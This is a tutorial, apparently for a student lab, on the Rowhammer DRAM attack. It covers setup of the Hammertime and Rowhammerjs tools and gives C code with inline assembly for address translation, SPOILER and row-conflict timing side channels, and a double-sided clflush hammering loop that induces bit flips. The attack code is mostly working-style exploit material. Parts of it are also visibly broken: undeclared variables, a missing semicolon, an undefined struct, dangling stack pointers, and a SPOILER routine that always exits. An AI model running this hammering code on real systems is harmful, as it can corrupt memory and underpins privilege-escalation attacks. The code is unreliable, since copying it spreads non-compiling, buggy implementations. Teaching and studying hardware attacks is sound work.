# Tutorial on Rowhammer

> ## Installation


GCC is the only package required for this tutorial. Should be installed by default in Linux OS
You must use Linux based OS as almost all the program suites below rely on the way Linux handles filesystems.
Other packages that will be required are:

  Hammertime
  https://github.com/vusec/hammertime

  Rowhammerjs
  https://github.com/IAIK/rowhammerjs
  



Instructions for download and installation these suites will be given as they are required to reduce frontloading.

> ## Basics on Rowhammer

Video Source:
https://www.youtube.com/watch?v=1iBpLhFN_OA

> ## Bit-Flip DEMO; Hammertime

Hammertime is an extensive program suite for testing and simulating a rowhammer attacks.
We will use this suite to see if your system is vulnerable to a rowhammer attack.

__________________________________________________________________________________________
First, we need some information about your computer to confirm that your computer can be hammered in the first place (whilst almost all DRAM systems are vulnerable, the tools below may not work on some systems). Find and save the following information:

1) What microarchitecture is your (probably) intel chip?

  gcc -march=native -Q --help=target | grep march

2) What DRAM is your computer using?

  sudo dmidecode -t memory

* Neeed information on both Type and Rank

3) Which OS version is your computer running?

  lsb_release -a
__________________________________________________________________________________________
Second, download and unzip Hammertime suite, found at https://github.com/vusec/hammertime
Note that Hammertime uses RAMSES submodule, found at https://github.com/vusec/ramses/tree/09283295333a2cca7302c0652a06a84e1089deff 

This submodule needs to be downloaded to ramses folder.

Be sure to make the Hammertime suite by calling "make"
on Hammertime root directory.
__________________________________________________________________________________________
Third, use RAMSES to automatically detect your memory configuration.

Call: 

  sudo ramses/tools/msys_detect.py

Follow the onscreen instructions and save the result as "mem.msys". Your .msys file should be a single line summary of your memory.
Confirm that your summary is correct by cross-referencing the data saved froms step 1. You may assume pcibase value to be correct
(you can check this value, too, by opening system-protected file; /proc/self/pagemap)
__________________________________________________________________________________________
Fourth, use hammertime/profile library to check for vulnerability.
[Hammertime library's own readme file for detailed instructions - it is explained well there]

Call:
  sudo profile/profile --s 256m mem.msys

(where 256m refers to 256 mB of memory space to test, and mem.msys should be the msys file that you created in the third step.)

The output should look like; 

(0 0 1 7 3baf  0) (0 0 1 7 3b5d  0) :

(0 0 1 7 3bde  0) (0 0 1 7 3b5d  0) :

(0 0 1 7 3c96  0) (0 0 1 7 3b5d  0) : (0 0 1 7 3c97  0) 0743|f7|ff

The results should be interpreted as (CHANNEL DIMM RANK BANK ROW COLUMN).
The first bracket describes the n-1 row being hammered, while the second bracket is n+1 row being hammered.
The third line is an example of a successful bitflip. It first shows the row that bitflip was found, followed by
BYTE OFFSET | RESULTANT DATA | INITIAL DATA information about the bitflip that has occurred.

Website Source:
https://medium.com/@Anna_IT/security-how-to-exploit-dram-with-hammertime-rowhammer-attack-step-by-step-61e60b415ef8


- Using Rowhammerjs on DDR4 <span style="color:orange">[10 mins]</span>
  - Show and explain the output 

Rowhammerjs is a rowhammer attack that does not utilize CLFLUSH command to still successively call on the same memory locations.
The Rowhammerjs repository has comprehensive step-by-step guide, hence it is recommended to follow the steps (https://github.com/IAIK/rowhammerjs).

Video Source:
https://www.youtube.com/watch?v=UAaPW-s1uUM
(suggestion; use Youtube's subtitles)

**Rowhammerjs may throw segmentation fault in some systems - this is both random and highly dependent on the system configuration.


> ## Lets do Rowhammer
Code largely taken from https://github.com/andrewadiletta/rowhammer/blob/main/andrew_rowhammer.c with small modifications.

```
//required C libraries
#include <stdio.h>
#include <stdint.h>			// uint64_t
#include <stdlib.h>			// For malloc
#include <string.h>			// For memset
#include <time.h>			// For sidechannel attacks
#include <fcntl.h>			// For O_RDONLY in get_physical_addr fn 
#include <unistd.h>			// For pread in get_physical_addr fn, for usleep
#include <sys/mman.h>
#include <stdbool.h>		// For bool
#include <sys/stat.h>

//some definitions to avoid magic numbers
//they will need to be modified if running on 64bit systems
#define PAGE_COUNT 256 * (uint64_t)256	// ARG2 is the buffer size in MB
#define PAGE_SIZE 4096
#define PEAKS PAGE_COUNT/256*2
#define ROUNDS2 10000
#define THRESH_OUTLIER 700	// Adjust after looking at outliers in t2.txt
```

### Step 1: Allocating memory at the userspace. Understanding virtual to physical address mapping. <span style="color:orange">[30 mins]</span>
- Memory allocation.

Simple step of allocating some memory space in userspace which will be used to attempt hammering.
The below method is one way of allocating the said space.


```
//struct to store metadata along with memory addresses
struct continuous_memory{
	uint8_t ** memory_addresses;
	int length;
	int start;
	int end;
};

//actual memory allocation - this search_buffer will be the space used to 'play around' in
uint8_t * search_buffer = mmap(NULL, PAGE_COUNT * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

struct continuous_memory * continuous_memory = malloc(sizeof(struct continuous_memory));

```
- Understand the virtual to physical address mapping.
```
// a 'universal' function to calculate phys-virt address conversion, used in many rowhammer libraries

static uint64_t get_physical_addr(uint64_t virtual_addr)
{
	static int g_pagemap_fd = -1;
	uint64_t value;

	// open the pagemap
	if(g_pagemap_fd == -1) {
	  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
	}
	if(g_pagemap_fd == -1) return 0;

	// read physical address
	off_t offset = (virtual_addr / 4096) * sizeof(value);
	int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
	if(got != 8) return 0;

	// Check the "page present" flag.
	if(!(value & (1ULL << 63))) return 0;

	// return physical address
	uint64_t frame_num = value & ((1ULL << 55) - 1);
	return (frame_num * 4096) | (virtual_addr & (4095));
}
```

<p> References to look at: <br>
https://stackoverflow.com/questions/51026411/convert-virtual-address-to-physical-address#51027647 <br>
https://github.com/IAIK/flipfloyd </p>


- Students can play with the code for more exploration.
- It is recommended that the students open /proc/self/pagemap themselves to see how the memory space is being handled by the OS.


### Step 2: Find contiguous memory allocation using SPOILER. <span style="color:orange">[30 mins]</span>
**There is non-SPOILER dependent way of finding physically contiguous memory space
But SPOILER is more reliable as it returns hardware-contiguous memory space
Code is written so that either method may be used**

- Basic overview of SPOILER.

SPOILER is a side-channel attack that exploits specific store behavior of Intel processors' microarchitecture.
Using this attack we are able to find a contiguous physical memory space which significantly increases our probability of hammering two rows in the same bank.

Video Reference:
https://www.youtube.com/watch?v=353WETEIXl0

- Usage of SPOILER.
```
// Assembly code is required for SPOILER, as provided below

#define SPOILER(_memory, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "rdtscp;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%eax;"\
   "rdtscp;"\
   "mfence;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)

void get_cont_mem_SPOILER(struct continuous_memory * ret, uint8_t * buffer){
  uint8_t * evictionBuffer;
	evictionBuffer = mmap(NULL, PAGE_COUNT * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	uint16_t * measurementBuffer;
	measurementBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));
	uint16_t * conflictBuffer;
	conflictBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));

  	#define WINDOW 64
	#define THRESH_OUTLIER 1000	// Adjust after looking at outliers in t2.txt
	#define THRESH_LOW 300		// Adjust after looking at diff (t2.txt)
	#define THRESH_HI 500		// Adjust after looking at diff (t2.txt)
  	//Run the program first to generate t2.txt, which shows the times required to fetch addresses
  	//Plot t2.txt to visually observe the side-channel attack in action
	
	int cont_start = 0;			// Starting and ending page # for cont_mem
	int cont_end = 0;
	
	t2_prev = 0;
	cl = clock();
	for (int p = WINDOW; p < PAGE_COUNT; p++)
	{
		total = 0;
		int cc = 0;

		for (int r = 0; r < ROUNDS; r++)		
		{
			for(int i = WINDOW; i >= 0; i--)
			{
				evictionBuffer[(p-i)*PAGE_SIZE] = 0;
			}

			SPOILER(evictionBuffer, &tt);
			if (tt < THRESH_OUTLIER)
			{
				total = total + tt;
				cc++;
			}
		}
		if (cc != 0) {
			measurementBuffer[p] = total / cc;
		}
		// Extracting the peaks
		if (total/ROUNDS-t2_prev > THRESH_LOW && total/ROUNDS-t2_prev < THRESH_HI)
		{
			peaks[peak_index] = p;
			peak_index++;
		}
		t2_prev = total / ROUNDS;
	}

  // Writing the timings into the file, required to figure out appropriate threshold times
  // The output of the file represents the nanosecond time elapsed to access consecutive address spaces. The occassional 'spike' in delays represent boundaries of consecutive memory space.
  //THRESH_OUTLIER is the numeric used to remove high-latency outliers potentially caused by system interrupts of some kind. (generally 1000ns is good enough)
  //THRESH_LOW is used to establish outline of the lowest access time, should be the floor of all values in t2
  //THRESH_HIGH is used to establish the 'spikes' in delay, should be set to approximately the floor of the 'spike' values - only discoverable after plotting t2 values.

//Uncomment to produce the file. t2.txt values will depend on system
	/*
	FILE *t2_file;
	t2_file = fopen("t2.txt", "w");
	for(int p = 0; p < PAGE_COUNT; p++)
		fprintf(t2_file, "%u\n", measurementBuffer[p]);
	fclose(t2_file);
	*/

	free(measurementBuffer);

	// Finding distances between the peaks in terms of # of pages
	for (int j = 0; j < peak_index - 1; j++)
	{
		apart[j] = peaks[j+1] - peaks[j];
	}

	// Here 1 unit means 256 pages = 1MB
	// 8 means we are looking for 9 peaks 256 apart = 8MB
	int cont_window = 8;
  int cont_win_addresses = cont_window * 256
	int condition;
	for (int j = 0; j < peak_index - 1 - cont_window; j++)
	{
		condition = 1;
		for (int q = 0; q < cont_window; q++)
		{
			condition = condition && (apart[j+q] == 256);
		}
		
		if (condition)
		{
			printf("\n******************%d MB CONTIGUOUS MEMORY DETECTED BY SPOILER******************\n", cont_window);
			uint8_t * special_buffer[cont_win_addresses];
	    ret->memory_addresses = malloc(sizeof(uint8_t*) * (cont_win_addresses));
	    for(int i = j; i < j + cont_win_addresses; i++){
	    	special_buffer[i-j] = &buffer[i*PAGE_SIZE];
	    }
	    ret->memory_addresses = special_buffer;
	    ret->length = cont_win_addresses;
	    ret->start = j;
	    ret->end = j+cont_window;
			break;
		}
	}
	if (cont_start == 0)
	{
		printf("\nUnable to detect required contiguous memory of %dMB within %luMB buffer\n\n", cont_window, PAGE_COUNT*PAGE_SIZE/1024/1024);
		exit(0);
	}
}

```

NON-SPOILER WAY
```

void get_continuous_mem(struct continuous_memory * ret, uint8_t * buffer){
	uint64_t phys_addr[PAGE_COUNT] = {0};
	uint64_t virt_addr[PAGE_COUNT] = {0};

	//Create array of physical addresses
	for (int k = 0; k < PAGE_COUNT; k++)
	{
		int phys = get_physical_addr((uint64_t) &buffer[k*PAGE_SIZE]);
		int virt = (uint64_t) &buffer[k*PAGE_SIZE];
		phys_addr[k] = phys>>12;  // Shift right to remove offset
		virt_addr[k] = virt>>12;  // Shift right to remove offset
  }
	
	int continuous = 0;
	int past_addr  = 0;
	int max = -1;
	int start = 0;
	int end = 0;
	int starttmp = 0;
	
	for(int p = 0; p < PAGE_COUNT; p++){
		if(phys_addr[p] == past_addr+1){
			continuous++;
			if(continuous > max){
				max = continuous;
			}	
		}
		else{
			if(continuous >= max){
				end = p-1;
				start = starttmp;
			}
			starttmp = p;
			continuous = 0;
		}
		past_addr = phys_addr[p];
	}

	//Create an array of pointers to the memory addresses that are continuous
	uint8_t * special_buffer[end-start];
	ret->memory_addresses = malloc(sizeof(uint8_t*) * (end-start));
	for(int i = start; i < end; i++){
		special_buffer[i-start] = &buffer[i*PAGE_SIZE];
	}
	ret->memory_addresses = special_buffer;
	ret->length = end-start;
	ret->start = start;
	ret->end = end;
}
```



### Step 3: Find same bank using row-conflict side-channel. <span style="color:orange">[30 mins]</span>
- Basic overview of row-conflict side-channel.

Row-conflict is not strictly necessary, as if you have contiguous physical memory space to work with.
This means that even if you don't bother with figuring out which addresses are in the same banks, you should still have 1/16 chance of hammering the same bank.
Still this greatly increases the chance of a successful rowhammer.

Row-conflict side-channel attack is largely similar in concept to SPOILER side channel attack, but simpler.
It picks one address (the start address) and one other address (chosen successively after the start address), then attempts to access both addresses.
If both addresses originate from the same bank, then it requires slightly longer time to flush the bank cache and re-fetch the address, which increases access time.
We use this information to find and collect an array of addresses in the same bank.


- Usage of row-conflict side-channel.
```
// Assembly code for row-conflict attack, largely similar to SPOILER

#define clfmeasure(_memory, _memory2, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "mov %%rdx, %%r11;"\
   "clflush (%%r11);"\
   "clflush (%%rbx);"\
   "mfence;"\
   "rdtsc;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%ebx;"\
   "mov (%%r11), %%edx;"\
   "rdtscp;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory), "d" (_memory2)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)

void getContinuousBank(struct continuous_bank* return_bank, struct continuous_memory * continuous_buffer, uint8_t * buffer){
	return_bank->conflict = (int*)malloc(sizeof(int)*(continuous_buffer->length));
	clock_t cl = clock();

	//Running row_conflict on the detected contiguous memory to find addressess going into the same bank
	#define THRESH_ROW_CONFLICT 350	// Adjust after looking at c.txt, similar in concept to SPOILER's THREHS_HIGH value
	int conflict[PEAKS] = {0};
	int conflict_index = 0;
	int total;

	uint32_t tt = 0;  //the variable which will be used to store the time
	float timer = 0.0;

	printf("Testing a total of %d addresses\n", continuous_buffer->length);

	for (int p = continuous_buffer->start; p < continuous_buffer->end; p++)
	{
		total = 0;
		int cc = 0;
		for (int r = 0; r < ROUNDS2; r++)
		{			
			clfmeasure(&buffer[continuous_buffer->start*PAGE_SIZE], &buffer[p*PAGE_SIZE], &tt);
			if (tt < THRESH_OUTLIER)
			{
				total = total + tt;
				cc++;
			}
		}
		if (total/cc > THRESH_ROW_CONFLICT)
		{
			return_bank->conflict[conflict_index] = p;
			conflict_index++;
		}
	}
	cl = clock() - cl;
	timer = ((float) cl)/CLOCKS_PER_SEC;

	//print out the conflict_index
	printf("Number of indicies in conflict: %d\n", conflict_index);

  	// Writing rowconflicts into the file, uncomment to produce the c.txt file
	/*
	FILE *c_file;
	c_file = fopen("c.txt", "w");
	for(int p = 0; p < cont_end - cont_start; p++)
		fprintf(c_file, "%u\n", conflictBuffer[p]);
	fclose(c_file);
	*/

	return_bank->indices = conflict_index;
}
```
### Step 4: Perform Rowhammer <span style="color:orange">[30 mins]</span>

Oh boy.


Most difficult parts are actually done, however - the physical addresses to hammer are known, so they simply need to be filled and hammered.


```
#define hammer10(_memory, _memory2)\
do{\
   asm volatile(\
   "mov $1000000, %%r11;"\
   "h10:"\
   "clflush (%%rdx);"\
   "clflush (%%rbx);"\
   "mov (%%rbx), %%r12;"\
   "mov (%%rdx), %%r13;"\
   "dec %%r11;"\
   "jnz h10;"\
   : \
   : "b" (_memory), "d" (_memory2)\
   : "r11", "r12", "r13"\
   );\
}while(0)

void get_flips(uint8_t *myBuffer, struct continuous_bank * myBank){
	clock_t cl;
	cl = clock();
	///////////////////////////////DOUBLE_SIDED_ROWHAMMER//////////////////////
	#ifdef PRINTING
		printf("\n------------DOUBLE SIDED HAMMERING on DETECTED CONTIGUOUS MEMORY-------------\n\n");
	#endif
	
	int h;
	bool flip_found10 = false;
	int flips_per_row10 = 0;
	int flippy_offsets10[PAGE_SIZE] = {0};
	
	for (h = 2; h < myBank->indices - 2; h = h+2)
	{
		
		//For 1->0 FLIPS
		printf("Hammering Rows %i %i %i\n", h/2, h/2+1, h/2+2);
		
		// Filling the Victim and Neighboring Rows with Own Data
		// We flood the data with all '1's to make it easier to see which bits flipped
		
		for (int y = 0; y < PAGE_SIZE; y++)
		{
			//If segfault, check here. There appears to be a bug with h value being larger than the total size of conflict array.
			myBuffer[(myBank->conflict[h]*PAGE_SIZE)+y] = 0x00;	// Top Row
			myBuffer[(myBank->conflict[h+2]*PAGE_SIZE)+y] = 0xFF;	// Victim Row
			myBuffer[(myBank->conflict[h+4]*PAGE_SIZE)+y] = 0x00;	// Bottom Row
		}

		// Hammering Neighboring Rows
		hammer10(&myBuffer[myBank->conflict[h]*PAGE_SIZE], &myBuffer[myBank->conflict[h+4]*PAGE_SIZE]);
		// If no bitflips, check here, as technically this implementation doesn't hammer rigorously enough.

		// Checking for Bit Flips

		for (int y = 0; y < PAGE_SIZE; y++)
		{
			if (myBuffer[(myBank->conflict[h+2]*PAGE_SIZE)+y] != 0xFF)
			{
				flip_found10 = true;
				printf("%lx 1->0 FLIP at page offset %03x\tvalue %02x\n", get_physical_addr((uint64_t)&myBuffer[(myBank->conflict[h+2]*PAGE_SIZE)]), y, myBuffer[(myBank->conflict[h+2]*PAGE_SIZE)+y]);
				flippy_offsets10[flips_per_row10] = y;
				flips_per_row10++;
			}
		}
	}
  printf("Total number of flips found are: %d\n", flips_per_row10);

  //we can return flippy_offsets10[] array for further use later on as we need
}

// Driver code

int main(int argc, char * argv[])
{
  printf("Rowhammer Demonstration\n");
	//!!!system("echo 1 | sudo tee /proc/sys/vm/compact_memory");
	
	//!!!srand((unsigned int) time(NULL));
	//Create buffer array
	uint8_t * search_buffer = mmap(NULL, PAGE_COUNT * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	struct continuous_memory * continuous_memory = malloc(sizeof(struct continuous_memory));

	get_continuous_mem(continuous_memory, search_buffer);
	printf("Got continuous memory\n");

	printf("getting bank\n");
	struct continuous_bank *continuous_bank = malloc(sizeof(struct continuous_bank));
	getContinuousBank(continuous_bank, continuous_memory, search_buffer);
	printf("got bank\n");

	//Return the first integer in bank
	uint8_t number_of_indicies = continuous_bank->indices;
	printf("Bank from main code: %d\n", continuous_bank->indices);


	get_flips(search_buffer, continuous_bank);

  return 1;
}
```
And we're done!